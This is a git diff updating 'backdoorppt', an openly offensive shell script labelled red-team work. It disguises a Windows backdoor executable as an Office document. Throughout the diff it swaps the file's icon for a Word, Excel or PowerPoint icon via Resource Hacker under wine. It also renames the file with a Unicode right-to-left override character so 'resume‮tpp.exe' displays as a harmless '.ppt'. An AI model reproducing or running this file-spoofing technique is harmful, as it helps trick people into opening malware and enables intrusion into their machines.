@@ -1,12 +1,14 @@
 #!/bin/sh
 ###
 # backdoorppt - a binary transformation tool
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.3
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.4
 # Suspicious-Shell-Activity (SSA) RedTeam develop @2017
 # codename: strange things happen under windows
 #
-# Supports wine 32 or 64 bits installations
-# 
+# [ TOOL DESCRIPTION ]
+# This tool Supports wine 32 or 64 bits installations
+# Available with 4 icons to change (backdoorppt/icons)
+#
 ###
 
 
@@ -32,7 +34,7 @@ Reset="${Escape}[0m";
 # ---------------------
 # variable declarations
 # ---------------------
-VeR="1.3"
+VeR="1.4"
 ArCh=`arch`
 IPATH=`pwd`
 HoME=`echo ~`
@@ -123,11 +125,14 @@ rUn=$(zenity --question --title="☠ BackdoorPPt ☠" --text "Execute this modul
 if [ "$?" -eq "0" ]; then
 
 
-# questions to user
+# orginal payload full-path variable
 UpL=$(zenity --title "☠ PAYLOAD TO BE TRANSFORMED ☠" --filename=$IPATH --file-selection --text "chose payload to be transformed") > /dev/null 2>&1
+# icon replacement variable
+IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "MS-Word-32x32.ico" FALSE "MS-Excel-32x32.ico" FALSE "MS-powerpoint-32x32.ico" FALSE "Vector_App.ico" --width 350 --height 260) > /dev/null 2>&1
+
 
   # wine configurtions (winecfg)
-  echo ${BlueF}[☆]${white} Select ${GreenF}windows 7${white} from winecfg ${Reset};
+  echo ${BlueF}[☆]${white} Select [${GreenF}windows 7${white}] from winecfg ${Reset};
   sleep 2
   winecfg > /dev/null 2>&1
   sleep 1
@@ -140,34 +145,38 @@ UpL=$(zenity --title "☠ PAYLOAD TO BE TRANSFORMED ☠" --filename=$IPATH --fil
       echo ${RedF}[☠]${white} ResourceHacker.exe '->' ${RedF} not found! ${Reset};
       sleep 1
       echo ${BlueF}[☆]${white} Installing ResourceHacker under .wine directory ${Reset};
-      xterm -T "BackdoorPPt" -geometry 90x26 -e "$arch $IPATH/reshacker_setup.exe && sleep 3"
+      xterm -T "BackdoorPPt" -geometry 90x26 -e "$arch $IPATH/bin/reshacker_setup.exe && sleep 3"
     fi
 
       # wine command to call resourcehacker and add a MS-WORD.ico to the backdoor
       echo ${BlueF}[☆]${white} Transforming backdoor agent '->' ${GreenF}done... ${Reset};
-      $arch $HoME/.wine/drive_c/"$PgFi"/"Resource Hacker"/ResourceHacker.exe -open $UpL -save $IPATH/backdoor.exe -action addskip -res $IPATH/MS-Word-32x32.ico -mask ICONGROUP,MAINICON,
+      $arch $HoME/.wine/drive_c/"$PgFi"/"Resource Hacker"/ResourceHacker.exe -open $UpL -save $IPATH/output/backdoor.exe -action addskip -res $IPATH/icons/$IcOn -mask ICONGROUP,MAINICON,
       echo ${BlueF}[☆]${white} Change backdoor agent icons '->' ${GreenF}done... ${Reset};
       sleep 1
 
     # insert .ppt hidden extension
     echo ${BlueF}[☆]${white} Adding agent hidden extensions '->' ${GreenF}done... ${Reset};
-    mv $IPATH/backdoor.exe  $IPATH/backdoor_ppt.exe > /dev/null 2>&1
+    mv $IPATH/output/backdoor.exe  $IPATH/output/backdoor_ppt.exe > /dev/null 2>&1
     sleep 1
 
-  cd $IPATH
+  cd $IPATH/output
   # rename backdoor name
   echo ${BlueF}[☆]${white} Word doc builder '(backdoorppt)' '->' ${GreenF}done... ${Reset};
   ruby -e 'File.rename("backdoor_ppt.exe", "resume\xe2\x80\xaetpp.exe")'
+  cd $IPATH
   sleep 1
 
 
 # -----------------------------
 # Display final output to user
 # -----------------------------
+echo ${YellowF}[⊶] Task over, Writing reports... ${Reset};
+sleep 2
 cat << !
 
-    Final file  : $IPATH/resumeexe.ppt
-    Tool Author : r00t-3xp10it (SSA© redTeam)
+    Icon select : $IcOn
+    Final file  : $IPATH/output/resumeexe.ppt
+    Tool Author : r00t-3xp10it (SSA RedTeam)
 
     Your backdoor agent its now transformed into one fake
     word doc (ppt) remmenber that .exe extensions will not
